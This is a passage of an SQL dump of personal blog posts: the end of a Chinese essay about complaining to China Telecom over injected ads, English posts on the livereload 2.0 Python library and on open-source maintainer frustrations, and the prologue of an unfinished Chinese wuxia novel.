被屏蔽一事的看法，以及此事對我的影響。因爲忙於寫一個庫，沒能及時回覆，深表歉意。\n\n這件事倒讓我想起之前的每日投诉电信计划了，是關於中國電信在網頁中插廣告的事。結果挺好的，中國電信停止向寬帶用戶推送第三方廣告。（那電信自己的呢？，存疑。）\n雖然我不能肯定自己起到了什麼作用，恐怕主要還是靠 @Fenng 等關注者多的人，因爲名人的影響力在那裏嘛。但是做過了，而且堅持了那麼久，還是挺開心的，當作形爲藝術罷。\n這過程裏，傷害了不少客服的心，頗過意不去。也收穫了詆譭與讚譽。譭之者不過言「蚍蜉撼大樹」，仿佛我不知道似的。\n\n知乎有一句廣告辭——認真你就贏了。深得我心。成熟卻讓你失去了較真的勇氣，總是在關鍵時刻提醒著你：這樣做又有什麼用呢？更何況，還有「被送快遞」的風險。\n政治味稍微多了點，談一個更生活化的例子。比如說智能手機，即使你一遍遍地教過了父母，但是他們依然手足無措。你給一個小孩子玩，什麼都不用教，過會兒他就會用了，即使他還不識字。\n小孩子無所畏懼，拿到手上左按按右按按，按得多了也就會了。但是父母不會，他們從不左按右按，總是依照你所教的步驟一步一步按下去，還總是擔心按錯了。這就是成熟病呀。他們不曾想，即使按錯了也沒什麼大不了的。正如你想多了一樣，「查水表」這種事並不會輕易發生。\n你看，雖然我寫得一塌糊涂，完全不知所云，但是仍然有發表出來的勇氣，也見得暫未患這成熟病了。最後送上顾城的一首詩，望君喜歡。\n天是灰色的路是灰色的楼是灰色的雨是灰色的在一片死灰中走过两个孩子一个鲜红一个淡绿\n\n\n中文妥協一詞與英文 compromise 頗不相同，中文的妥協更多時候只是一方的退讓。↩\n當我談成熟時，這個成熟只限定於本文的意義。它是非普適的，亦不是你認爲的意義。↩\nThe Montgomery Bus Boycott, a seminal event in the U.S. civil rights movement, was a political and social protest campaign against the policy of racial segregation on the public transit system of Montgomery, Alabama.↩\nRosa Louise McCauley Parks was an African-American civil rights activist, whom the United States Congress called "the first lady of civil rights" and "the mother of the freedom movement".↩\n\n', NULL, NULL, NULL),
(37, 'http://lepture.com/en/2013/new-life-of-livereload', 'New life of livereload', '<p>I created <a href="https://github.com/lepture/python-livereload">livereload</a>\n(implemented in Python) one year and 8 months ago. The first version was\nreleased on May 4th, 2012. I had been working on it for a while, but I\ndidn''t enjoy it myself.</p>\n<p><a href="http://livereload.com/">LiveReload</a> is a Mac software that monitors\nchanges in the file system. A quote from the official website:</p>\n<blockquote><p>As soon as you save a file, it is preprocessed as needed, and the browser\nis refreshed.</p>\n</blockquote><p>And my implementation in Python is a command line tool that simulates the\nbehavior of LiveReload, a bit like <a href="https://github.com/guard/guard">guard</a>.</p>\n<p>The reason why I created this project is pretty simple. I was working in a\nPython-only development environment, it would be nice that everything is\nin Python. However, things changed in the last year, I am more a front end\ndeveloper than a back end pythonist. I enjoy nodejs, I also enjoy other\nlanguages like ruby and golang.</p>\n<p>Anyway, I don''t like to start another server for watching file changes only,\nthe original design of Guardfile is not good enough, at least I am not\nsatisfied. The simulation just doesn''t work for me.</p>\n<blockquote class="cite-quote"><p>most things have some design behind,\nas people copy it, the original design gets obscured and forgotten,\nthe original design might no longer apply</p>\n<cite>Armin Ronacher</cite>\n</blockquote><p>This is a slide of a talk by Armin Ronacher — <a href="https://speakerdeck.com/mitsuhiko/thinking-outside-the-box">Thinking Outside The Box</a>.</p>\n<h2>Create something I will use in the daily life</h2>\n<p>The original copied one has nothing new, nothing special for Python that\nI would use it in my daily life. This makes me sad. So I have no much\nenthusiasm in the maintainence of it.</p>\n<p>But I do believe that livereload is a good idea. Maybe I just did it wrong.\nOne day, a brilliant idea came to me — livereload for wsgi.</p>\n<p>A simple example of the idea:</p>\n<pre><code class="lang-python">from livereload import Server\n\nserver = Server(wsgi_app)\nserver.watch(''static/app.css'')\nserver.serve()</code></pre>\n<p>Wow, that looks good. It seems something that I will use in my daily life.\nSince I prefer Flask, I can write the scripts with Flask-Script in a\n<code>manage.py</code> file:</p>\n<pre><code class="lang-python">app = create_app()\n\n@manager.command\ndef liveserver(port=5000):\n    from livereload import Server\n    server = Server(app.wsgi_app)\n    server.watch(''static/*.css'')\n    server.serve(port=port)</code></pre>\n<p>And whenenver a css file changes, the browser will refresh it itself.</p>\n<p>Actually, my environment of front end development is far more complex,\nI use rework for css processing, component for javascript modular. The\nreal example would be gorgeous.</p>\n<p>Take a peep of my scripts:</p>\n<pre><code class="lang-python">@manager.command\ndef liveserver(port=5000):\n    from livereload import Server\n\n    server = Server(app.wsgi_app)\n    server.watch(''assets/styles/*.css'', ''make -C assets rework'')\n    server.watch(''assets/lib/*.js'', ''make -C assets build'')\n    server.watch(''app/templates'')\n    server.serve(port)</code></pre>\n<h2>Do one job, and do it well</h2>\n<p>Version 2.0 of livereload is more a library rather than an application.\nWhich means other libraries in Python can easily bundle it in. I hope it\ncan be a great library.</p>\n<p>The executable command line tool is removed from livereload. It may come\nback again, but not soon. The compilers like uglifyjs, lesscss, slim,\nCoffeeScript are removed from livereload too.</p>\n<p>For now, livereload will focus on one thing — livereload. And livereload\nwell.</p>\n<p>The lack of compilers does not affect much. Since livereload provides you\na way to execute shell command. As you can see in the above example that\n<code>server.watch</code> supports executing shell commands, so that we can do:</p>\n<pre><code class="lang-python">server.watch(''src/foo.js'', ''uglifyjs src/foo.js -m -o build/foo.js'')</code></pre>\n<p>That''s why compilers are removed, since every compiler is some sort of a\nshell command, there is no reason for wrapping them in Python any more.</p>\n<p>By removing compilers, livereload focuses on the server implementation,\nand file watcher. The core code is much simple now.</p>\n<h2>Take advantage of existed tools</h2>\n<p>We programers like to reinvent tools. Sometimes we create things better\nthan the old ones, sometimes we fail. The most valuable tool I learned\nin the last two years is Makefile.</p>\n<p>I think every programer should know Makefile, and take the advantage of\nit. Like what I did/do in my daily life. The examples above are using\nMakefile:</p>\n<pre><code>server.watch(''assets/styles/*.css'', ''make -C assets rework'')\n\n</code></pre>\n<h2>The future</h2>\n<p>The rewritted version 2.0 of livereload was released days ago. There are\nfeatures not implmented, bugs not fixed, but the concept works well. It\nis not just an implementation <strong>of Python</strong>, it is an implementation\n<strong>for Python</strong>.</p>\n<p>The code is much more pretty than before. It is well documented and tested.\nI hope people will enjoy it. It is a library now, I am looking forward to\nlibraries that depend on this project and making the web development of\nmore fun.</p>', '2014-11-06 23:42:49', 5, '2013-12-31 05:30:00', '2013-12-31 05:30:00', 0, '[["server", 0.36021898313822975], ["livereload", 0.3377052966920904], ["app", 0.20262317801525423], ["Python", 0.20262317801525423], ["watch", 0.18010949156911488], ["Server", 0.13508211867683617], ["more", 0.13508211867683617], ["assets", 0.13508211867683617], ["my", 0.13508211867683617], ["file", 0.13508211867683617], ["css", 0.13508211867683617], ["command", 0.13508211867683617], ["like", 0.11256843223069679], ["will", 0.11256843223069679], ["port", 0.11256843223069679], ["wsgi", 0.09005474578455744], ["implementation", 0.09005474578455744], ["do", 0.09005474578455744], ["enjoy", 0.09005474578455744], ["design", 0.09005474578455744]]', NULL, NULL, 'I created livereload\n(implemented in Python) one year and 8 months ago. The first version was\nreleased on May 4th, 2012. I had been working on it for a while, but I\ndidn''t enjoy it myself.\nLiveReload is a Mac software that monitors\nchanges in the file system. A quote from the official website:\nAs soon as you save a file, it is preprocessed as needed, and the browser\nis refreshed.\nAnd my implementation in Python is a command line tool that simulates the\nbehavior of LiveReload, a bit like guard.\nThe reason why I created this project is pretty simple. I was working in a\nPython-only development environment, it would be nice that everything is\nin Python. However, things changed in the last year, I am more a front end\ndeveloper than a back end pythonist. I enjoy nodejs, I also enjoy other\nlanguages like ruby and golang.\nAnyway, I don''t like to start another server for watching file changes only,\nthe original design of Guardfile is not good enough, at least I am not\nsatisfied. The simulation just doesn''t work for me.\nmost things have some design behind,\nas people copy it, the original design gets obscured and forgotten,\nthe original design might no longer apply\nArmin Ronacher\nThis is a slide of a talk by Armin Ronacher — Thinking Outside The Box.\nCreate something I will use in the daily life\nThe original copied one has nothing new, nothing special for Python that\nI would use it in my daily life. This makes me sad. So I have no much\nenthusiasm in the maintainence of it.\nBut I do believe that livereload is a good idea. Maybe I just did it wrong.\nOne day, a brilliant idea came to me — livereload for wsgi.\nA simple example of the idea:\nfrom livereload import Server\n\nserver = Server(wsgi_app)\nserver.watch(''static/app.css'')\nserver.serve()\nWow, that looks good. It seems something that I will use in my daily life.\nSince I prefer Flask, I can write the scripts with Flask-Script in a\nmanage.py file:\napp = create_app()\n\n@manager.command\ndef liveserver(port=5000):\n    from livereload import Server\n    server = Server(app.wsgi_app)\n    server.watch(''static/*.css'')\n    server.serve(port=port)\nAnd whenenver a css file changes, the browser will refresh it itself.\nActually, my environment of front end development is far more complex,\nI use rework for css processing, component for javascript modular. The\nreal example would be gorgeous.\nTake a peep of my scripts:\n@manager.command\ndef liveserver(port=5000):\n    from livereload import Server\n\n    server = Server(app.wsgi_app)\n    server.watch(''assets/styles/*.css'', ''make -C assets rework'')\n    server.watch(''assets/lib/*.js'', ''make -C assets build'')\n    server.watch(''app/templates'')\n    server.serve(port)\nDo one job, and do it well\nVersion 2.0 of livereload is more a library rather than an application.\nWhich means other libraries in Python can easily bundle it in. I hope it\ncan be a great library.\nThe executable command line tool is removed from livereload. It may come\nback again, but not soon. The compilers like uglifyjs, lesscss, slim,\nCoffeeScript are removed from livereload too.\nFor now, livereload will focus on one thing — livereload. And livereload\nwell.\nThe lack of compilers does not affect much. Since livereload provides you\na way to execute shell command. As you can see in the above example that\nserver.watch supports executing shell commands, so that we can do:\nserver.watch(''src/foo.js'', ''uglifyjs src/foo.js -m -o build/foo.js'')\nThat''s why compilers are removed, since every compiler is some sort of a\nshell command, there is no reason for wrapping them in Python any more.\nBy removing compilers, livereload focuses on the server implementation,\nand file watcher. The core code is much simple now.\nTake advantage of existed tools\nWe programers like to reinvent tools. Sometimes we create things better\nthan the old ones, sometimes we fail. The most valuable tool I learned\nin the last two years is Makefile.\nI think every programer should know Makefile, and take the advantage of\nit. Like what I did/do in my daily life. The examples above are using\nMakefile:\nserver.watch(''assets/styles/*.css'', ''make -C assets rework'')\n\n\nThe future\nThe rewritted version 2.0 of livereload was released days ago. There are\nfeatures not implmented, bugs not fixed, but the concept works well. It\nis not just an implementation of Python, it is an implementation\nfor Python.\nThe code is much more pretty than before. It is well documented and tested.\nI hope people will enjoy it. It is a library now, I am looking forward to\nlibraries that depend on this project and making the web development of\nmore fun.', NULL, NULL, NULL),
(38, 'http://lepture.com/en/2013/unpleasant-open-source', 'The Unpleasant Part of Open Source', '<p>It has been 9 months since I sent the <a href="https://github.com/chjj/marked/pull/129">renderer feature</a> to marked.\nIt was merged some days ago, when I finally lost my patience and created\na forked project named <a href="https://github.com/lepture/markit">markit</a>.</p>\n<p>I do not suggest you use markit right now. We are working on marked. And\nwe hope that renderer feature will be available soon.</p>\n<hr />\n<p>Why it takes so much time for one pull request? Reason varies from people\nto people. Maybe he is focusing on other projects. Maybe he just doesn''t\nlike this feature. Maybe FUD.</p>\n<blockquote class="cite-quote"><p>marked does so many weird optimizations that I''m worried only I understand</p>\n<cite>Christopher Jeffrey</cite>\n</blockquote><p>I don''t blame <a href="https://github.com/chjj">Christopher Jeffrey</a>. On the\ncontrary, he did a great job. marked is a well written, good designed\nproject. I appreciate his humility for I''ve read the code of markdown-js\nwhich I am just too stupid to understand.</p>\n<p>It is usually the fear of breaking things, the uncertainty of the changes,\nand the doubt of the people that stops us.</p>\n<hr />\n<p>We open source not because people need us. We just happen to open source\nthings that solve our problems, and wish it may help other people. Open\nsource can be a business for a company, but not for individuals.</p>\n<blockquote class="cite-quote"><p>Lots of people in the Open Source community develop something that solve\nparticular problems they have themselves.</p>\n<cite>Armin Ronacher</cite>\n</blockquote><p>I created <a href="http://lepture.com/create-oauth-server">Flask-OAuthlib</a> for my own, because I\nneeded to create an OAuth 2 server at that time. I contribute to OAuthLib,\nbecause I need to fix that bug or add that feature for Flask-OAuthlib. I\ndon''t contribute for my own amusement.</p>\n<p>Armin Roncher wrote in his recent post <a href="http://lucumr.pocoo.org/2013/11/28/emotional-programming/">Emotional Programming in Open Source</a>:</p>\n<blockquote><p>I found it quite hard this year to work on my own projects because the\nbug trackers were full of things I personally did not really care about.\nThe things I wrote over the last few years all work so well for me, that\nI don''t need to fix problems or add things.</p>\n</blockquote><p>That is true for individual devlopers. At least that is true for me.</p>\n<p>Individual developers open source in their own time, they don''t get paid.\nHowever, sometimes, they are too good to accept features that they don''t\ncare. This is the time for us to give our thanks, our stars and our tweets.</p>\n<hr />\n<p>Our stars and tweets matter a lot. A good library should be promoted. Yes,\nI mean <a href="https://github.com/idan/oauthlib">OAuthLib</a>. The funny things is that python-oauth2 has\nmore stars than OAuthLib. python-oauth2 is not really designed for OAuth 2,\nit is OAuth 1. What a sarcastic reality!</p>\n<p>That''s why we should promote the good libraries. Let them to be known. This\nencourages developers and makes them happy — but sometimes it may be a\nburden to them.</p>\n<p>It takes time to build a good library — the design, the documentation, and\nthe test cases.</p>\n<hr />\n<p>Somtimes, when you finish a good project, a good name for your project is\nalready taken by another people. And when you find out that it is only a\nspawn of a unix command, you feel angry that you have to name your project\nas "something 2". That is really disappointed.</p>\n<p>May you happy, may the developers happy.</p>\n<blockquote><p>high quality of lots of Open Source code is that the developers are\ngenerally happier writing it</p>\n</blockquote>', '2014-11-06 23:42:49', 5, '2013-12-06 08:40:00', '2013-12-06 08:40:00', 0, '[["people", 0.23639370768446324], ["good", 0.23639370768446324], ["things", 0.2026231780152542], ["project", 0.1688526483460452], ["time", 0.1688526483460452], ["don", 0.1688526483460452], ["own", 0.13508211867683614], ["source", 0.13508211867683614], ["they", 0.13508211867683614], ["our", 0.13508211867683614], ["marked", 0.13508211867683614], ["because", 0.13508211867683614], ["my", 0.13508211867683614], ["feature", 0.13508211867683614], ["developers", 0.13508211867683614], ["Open", 0.13508211867683614], ["just", 0.1013115890076271], ["them", 0.1013115890076271], ["OAuthLib", 0.1013115890076271], ["Source", 0.1013115890076271]]', NULL, NULL, 'It has been 9 months since I sent the renderer feature to marked.\nIt was merged some days ago, when I finally lost my patience and created\na forked project named markit.\nI do not suggest you use markit right now. We are working on marked. And\nwe hope that renderer feature will be available soon.\n\nWhy it takes so much time for one pull request? Reason varies from people\nto people. Maybe he is focusing on other projects. Maybe he just doesn''t\nlike this feature. Maybe FUD.\nmarked does so many weird optimizations that I''m worried only I understand\nChristopher Jeffrey\nI don''t blame Christopher Jeffrey. On the\ncontrary, he did a great job. marked is a well written, good designed\nproject. I appreciate his humility for I''ve read the code of markdown-js\nwhich I am just too stupid to understand.\nIt is usually the fear of breaking things, the uncertainty of the changes,\nand the doubt of the people that stops us.\n\nWe open source not because people need us. We just happen to open source\nthings that solve our problems, and wish it may help other people. Open\nsource can be a business for a company, but not for individuals.\nLots of people in the Open Source community develop something that solve\nparticular problems they have themselves.\nArmin Ronacher\nI created Flask-OAuthlib for my own, because I\nneeded to create an OAuth 2 server at that time. I contribute to OAuthLib,\nbecause I need to fix that bug or add that feature for Flask-OAuthlib. I\ndon''t contribute for my own amusement.\nArmin Roncher wrote in his recent post Emotional Programming in Open Source:\nI found it quite hard this year to work on my own projects because the\nbug trackers were full of things I personally did not really care about.\nThe things I wrote over the last few years all work so well for me, that\nI don''t need to fix problems or add things.\nThat is true for individual devlopers. At least that is true for me.\nIndividual developers open source in their own time, they don''t get paid.\nHowever, sometimes, they are too good to accept features that they don''t\ncare. This is the time for us to give our thanks, our stars and our tweets.\n\nOur stars and tweets matter a lot. A good library should be promoted. Yes,\nI mean OAuthLib. The funny things is that python-oauth2 has\nmore stars than OAuthLib. python-oauth2 is not really designed for OAuth 2,\nit is OAuth 1. What a sarcastic reality!\nThat''s why we should promote the good libraries. Let them to be known. This\nencourages developers and makes them happy — but sometimes it may be a\nburden to them.\nIt takes time to build a good library — the design, the documentation, and\nthe test cases.\n\nSomtimes, when you finish a good project, a good name for your project is\nalready taken by another people. And when you find out that it is only a\nspawn of a unix command, you feel angry that you have to name your project\nas "something 2". That is really disappointed.\nMay you happy, may the developers happy.\nhigh quality of lots of Open Source code is that the developers are\ngenerally happier writing it\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(39, 'http://lepture.com/zh/2013/wuxia-novel', '寫一篇武俠等讀者', '<p>這是一篇武俠小說，是 2008 年寫作的，可是未完成。前些時候，翻閱以前練手的作品，無意間發現的，可是竟想不起來要寫一個甚麼樣的故事了。</p>\n<p>這一系列，前後快五萬字了，但是我對後面的故事並不滿意。即使滿意了，也不知道接下來要寫些甚麼，所以不如推倒重來，重新構思一個故事。遺憾的是，我並不擅長寫故事，我喜歡寫景，寫環境，寫氛圍，寫心理，唯獨故事是個軟肋。如果將這些裝飾去掉，這個故事恐怕又無趣極了。</p>\n<p>但是楔子部分我還是挺喜歡的，雖然很多情節的發展無法理解，有些情景又過於飄逸，人物塑造沒有特點。可是畢竟是自己寫的，總忍不住要包庇一下。如果有可能的話，希望能夠寫完。</p>\n<p>之前申請了一個郵件列表 <a href="http://tinyletter.com/lepture">tinyletter.com/lepture</a>，我將在這個郵件列表裡更新新的章節。如果有興趣的話，請訂閱之。訂閱者多於 200 人後，我將開始構思這個故事。所以想要繼續看下去的同學，廣泛傳播之。</p>\n<p>下面先預覽一下我將保留的楔子部分吧。</p>\n<h2>楔子</h2>\n<p>桂花蒸的夜，到处弥漫着一股热烘烘的清新。刚过了中秋，月还是银盘似的满月，然而月光不像平时般清冷，是暖玉里散发出的光泽，温润莹澈。</p>\n<p>月光照朱楼，照在二楼的丫鬟鸣翠身上。她着一袭翠竹底色的描白敞袖褂子，下面是藕合色齐踝长裙，发钗已经退去了，头发顺背直披下来。这时候她正凭栏远望那一轮圆月，凭空里轻声叹了口气。她卷起袖子，两只胳膊搭在栏干上，月光直泻过来，越发显得她膀子白净了，然而偏偏于这白净的手臂上刻下了几道血痕，是鞭子抽打过的。鸣翠低头瞟了瞟，咬了咬嘴，便又向着月亮瞧去。</p>\n<p>她屋里还有两个丫鬟同住，下人们的住所自然是略嫌挤些，倒没什么可抱怨的。她听到身后有动静，便回过头来看了看，是鸣微。</p>\n<p>鸣翠便放下了袖子，问她道：“你怎么醒了？”</p>\n<p>鸣微掀起毯子下床过来，伸了伸胳膊，舒展一下筋骨，道：“这天怪热的，竟被热醒了！你怎么还没睡？”</p>\n<p>鸣翠便又转过头去看月亮，轻声道：“虽然热，你倒是披一件衣裳，比不得夏天，到底是入了秋，仔细着凉。你也过来看月亮吧。”</p>\n<p>鸣微笑道：“哪里就着凉了！”说着便过去了。她只穿了一件月白色里背心，光着脚，头发是枕过后的凌乱的发式，她便张手理了理，拉顺了披到背后。鸣微道：“你倒是好心，你们大姑娘竟不曾替你想过？手伸过来给我看看，我这里还有些药膏，是上月张大夫来时我私底下向他要的，拿来给你涂涂。”</p>\n<p>鸣翠苦笑道：“我们小姐也真是命苦了，自小便死了亲娘，而今大了些，老爷竟要将她嫁给一个傻子，换了是我，我也是不肯嫁的。”</p>\n<p>鸣微叫道：“哎呀呀，大小姐。你左右不过一个丫鬟，将来最多不过放出去配个小厮罢了。你倒想想，楚王的傻儿子总要强过那些灰孙子的灰儿子吧。”</p>\n<p>“你们嚷什么呢？还不睡么！”是屋子里另一个丫鬟的声音。</p>\n<p>鸣翠轻声道：“小声点吧，别把她给吵起来了。——我们是丫鬟，小姐可不是。阖府上下，哪个不觉得把小姐嫁给个傻子委屈了小姐！就我们这样的人家，要招俊俏哥儿作上门女婿，那少说也得来个千把人。真搞不懂老爷是怎么想的，居然要将小姐嫁给个傻子！”</p>\n<p>鸣微道：“你倒是少说点吧，仔细给人告去了老爷，又是一顿好打！其实老爷也不容易了，自从夫人去了，这么些年来也没——阿嚏！”</p>\n<p>鸣翠道：“快进去焐一焐。我说的吧，叫你仔细着了凉，你又不听。哎呀，经你一闹，搅得人越发睡不着了，你快进去睡去，让我一个人静静，过会儿也好去睡觉。”</p>\n<p>月影映在蟹色的暮空里，仿佛一张药膏子，贴在划破了的天空，一息突兀的沉痛。鸣翠终究没有睡下，直愣愣地瞧着远方，“不知道小姐现在怎么样了？！”</p>\n<hr />\n<p>她小姐叫李溆茗，刚过了十五岁，正是谈婚论嫁的年纪。她是从下人那里听说的，她父亲给她说了个傻子夫婿。她自然不肯，同父亲闹也没有结果，没奈何，只好求着丫鬟鸣翠帮忙打点一下，疏通疏通家里的奴仆，自己备了细软逃出府去。</p>\n<p>买舟南下，至公安歇脚。</p>\n<p>她这还是第一次出门，格外兴奋，对一切事物倍感新鲜。然而快乐总是不长久，包袱很快便弄丢了，也不知是被偷去了还是自己给忘在哪里了，但是结果总是一样，自己已经陷入了穷困。幸好还有些许随身的饰物可以拿去当掉，也足够回家了。</p>\n<p>可是真的就这样回家么？她不甘心，怎么会甘心！才出走两日便回府，叫人知道了还不笑掉大牙！她咬了咬牙，狠下心来，怎么也得过上一个月再回家，现在就留在公安吧，得熬且熬。</p>\n<hr />\n<p>八月廿四，这并不是一个特殊的日子，平凡的早晨，平凡的街市，平凡的人们以及他们平凡的吵嚷声。太阳还未升起，天已经放白，菜市场里一阵喧闹，卖菜的小贩与买菜的妇人叨唠着价钱，为一文钱而争得面红耳赤。</p>\n<p>溆茗嗤鼻而笑，她当然不能嘲笑他们的小器，她也不愿意去嘲笑这些人，有什么可笑的呢！她只是自嘲——她竟连一文钱都没有了！这实在太可笑，她连值得一当之物都没有了，只有这一身的丝绸箭袖还值些钱，但是现在恐怕也不值钱了，纵使很值钱，她也不能去当掉。她这时散步于菜市场中，蓬松的头发凌乱着，沾满了灰尘泥垢，土灰色的脸上纵横几笔无奈，土灰色的衣衫上镂空几缕破洞，是纯粹的土的灰色，一种不起眼的色彩。</p>\n<p>菜市场并不只卖菜，有时还有卖粥卖馒头的。像屠夫的刀，也并不只是宰猪宰牛的，有时候它还可以宰人。卖粥的开始吆喝起来：“粥，热乎乎的粥，一文钱一碗咯！”卖馒头的也接着吆喝道：“馒头咯，两文钱三个咯！”</p>\n<p>溆茗朝他们瞪了一眼，心里恨恨道：“嚷什么嚷！真烦人，把人家肚子都给叫饿了。”可是她没有钱，她第一次深陷于这潦倒的尴尬境地，只有无可奈何地叹气，甚至自己都开始怀疑起当初的决定了，心下悔恨：也许嫁给楚王的那傻儿子至少比现在强些吧。</p>\n<p>这次的离家出走，她经历了许多的第一次，第一次出了荆州城，第一次乘船，第一次住客栈，第一次进当铺……第一次流落街头，现在又是第一次乞讨，而且还是向卖馒头的小贩乞讨，倘若被拒绝，那可真是无地自容了。幸而这小贩心还好，给了她两个馒头，溆茗心里默默祝道：“将来必定加倍奉还。”可是她没出声，说了别人也只有把她当疯子，徒惹嘲笑。</p>\n<p>菜市场里忽然起了异样的声音，也是吵嚷，然而不似先前的那般平和的吵嚷，夹杂了几许恐慌。是几个无赖前来捣乱，一阵推扰着向溆茗这边过来，他们倒并非冲着她来的，不过正好溆茗在市场的一头，他们是从另一边砸过来的，稀稀啦啦乒乒乓乓，先来个下马威，震住了小贩们，才方便收保护费嘛。</p>\n<p>溆茗又多了一个第一次的经历，第一次被无赖围了起来，看他们张牙舞爪地一点一点逼近。她不住地向后退去，不过三四步便抵着一块案板了。</p>\n<p>“是个娘们，洗一洗兴许还挺标致的，咱们抓回去卖给叶大娘倒也不错。”是一个无赖的声音。很动听的声音，天生的歌喉里的声音，可是偏偏用来说了这样的句子，是对才能的浪费也是对才能的侮辱！</p>\n<p>突然，一切都静了下来。</p>\n<p>太阳已经露出了轮廓，在景泰蓝的天空绘出酡红的一轮圆，又将这酡红溢射出去，醉染了附近的云朵，也醉染了溆茗的面颊。无端的，于这醉人的柔和的日光里现出一张俊秀的脸庞来，线条明晰的轮廓，方脸，浓眉，鹰鼻，细唇，只是眼神里却一片散漫与颓丧，不似他身体一般的精神抖擞。他穿一件淡桃色无绣丝制长袍，拦腰一围浅黄色丝巾玉绦，下面是灰白描翠的裤子，土色布靴，没有束冠，长发披肩而下，略嫌零乱。</p>\n<p>六个无赖定格在了那里，还是原先的姿势，唯一的不同便是多了喉头上的一滴血。他过到一个无赖身前，右手食指抹去了那一滴血，又顺手擦在了自己衣服上。他就这样依次地将六滴血都抹到了衣服上，然而衣服上没有留下血迹，血像活了一般，融入到这淡桃色里，使这份淡桃色浓了些许艳丽。</p>\n<p>无赖们还是不动，画面永久地定格在了那里，不仔细看，连伤口都没有，简直就是活生生的动弹不得的人。他俯身到溆茗这边，伸手过来；溆茗瞧了瞧，觉得满心的愉快，也就搭手过去了。两个人离开菜市场，隐没在了人群里，菜市场也就回复了往日的平和的吵嚷，像是做了一个梦，然而现在又醒了。</p>\n<hr />\n<p>街道上开始热闹起来，大多数的店铺也已经开门做起了生意。</p>\n<p>溆茗被带去洗过澡换过衣衫，她又回复了往昔的小姐模样，虽然衣着并不十分华贵。一袭玉黄的长布衫子，土褐色粗布裤子，黑色布靴，可是她面色红润，在这不施粉黛的眉目间透露出几许清丽脱俗，发式挽了个叠嶂的云髻，于发束插了支里黄的玉簪。溆茗觉得还满意，他应该会喜欢的。</p>\n<p>他们走在街道上，手牵着手，招惹来路人的侧目而视。可是他们不理会，依旧我行我素旁若无人地走着。</p>\n<p>溆茗仰头问道：“我们这是要去哪里？”</p>\n<p>公子依旧迈步向前，答道：“荆州。”</p>\n<p>溆茗不禁一震，仍是仰面望他道：“去荆州干什么？”</p>\n<p>公子的回答依旧简单——“杀人。”</p>\n<p>溆茗嘴角微微翘起，露出一息狡黠的笑，她问道：“杀谁？”</p>\n<p>公子道：“楚君子。”</p>\n<p>溆茗问道：“谁？”</p>\n<p>公子道：“李君如。”</p>\n<p>溆茗一颤，“啊”了一声，呃然问道：“为什么？为什么要杀他？”</p>\n<p>公子停下脚步，回过头来，一脸严肃，道：“我讨厌君子。君子比无赖更叫人讨厌。我恨他们。我要杀尽天下的无赖与君子。”</p>\n<p>溆茗紧紧握住他的手，咬牙道：“如果我求你别去杀他，你愿不愿意？”</p>\n<p>公子摇了摇头。</p>\n<p>“如果换作我求你别去杀他，你可愿意？”这声音来自遥远，然而仿佛又是近在咫尺，每一字都清清楚楚地落在了公子的耳朵里。</p>\n<p>公子拦腰抱起溆茗，箭步如飞奔向那个声音。</p>\n<p>街市一阵骚动。</p>\n<hr />\n<p>这时候出城的多是农人，才刚刚卖过了蔬菜，现在又要匆匆赶着回家，为了生计奔波。他们一刻也不停地迈着自己的步子，肩上负了扁担，扁担两头挂着的竹框也已空去，现在看上去一身轻松，这倒不是因为没有负重的关系，能够这样早就将菜给卖净，腾出时间来干点别的事，无论如何也是值得高兴的。</p>\n<p>唯有一位槁项黄馘的老者侍立于道上，一动不动。他佝偻着身子，一头散披的白发，身穿梨花白的绣竹宽袖长裙羽衣，束玉白色龙纹宫绦，裤子给裙摆遮住了，不见风彩，脚上蹬着一双白履，只是白，白得耀眼，白得一尘不染，仿佛不是尘世里的人。</p>\n<p>老者咳嗽了两声，自言道：“言公子来了？”</p>\n<p>于是他又开始咳嗽起来，这一声咳嗽过了，他眼前便现出两个人来，他望着他们，细细打量了一番，又自言道：“言公子来了？”。</p>\n<p>溆茗扭头睃了公子一眼，心下道：“唔，原来他姓言。”</p>\n<p>言公子笑道：“先生怎知在下姓言？”</p>\n<p>老者又咳嗽起来，顿了顿道：“能使出如此的武功，必然内力极为精湛，而放眼天下，能有如此内力的，除了言家的人外，也就止二三人罢了。然而不巧，这二三人皆是我相识的。”</p>\n<p>言公子叹道：“先生都看见了？”</p>\n<p>老者道：“我虽然看见了，但是要阻你一阻也是万万不能的。”</p>\n<p>言公子笑道：“先生想必就是隐机子吧？孤竹子和松涛子在下已经见过了。”</p>\n<p>老者又咳嗽起来，咳过后接道：“那么，我若是请公子到寒舍一叙，不知公子可愿意？哎——没有想到杨兄弟也败给了你。”他说着便迈步引路起来。</p>\n<p>言公子便牵过溆茗的手，跟着老者向远郊走去。</p>\n<p>言公子笑道：“松涛子倒并非败于在下手中，他一路追踪在下，在下避之唯恐不及，哪里敢同他交手！然而半路上，他不知得了什么消息，现下已经赶去长安了。”</p>\n<p> “唔，这就难怪了，” 老者嘀咕了声，又向言公子两个道，“寒舍不远，就在前面。”说着便加紧脚步，鹤飞一般，全然不似先前的佝偻形态，正与他那一身的装束合为一体，羽化登仙。</p>\n<p>言公子再次负起溆茗，脚下不停，紧跟上老者，心里疑惑道：“这隐机子所使的倒不似轻功。奇怪，奇怪。”</p>\n<hr 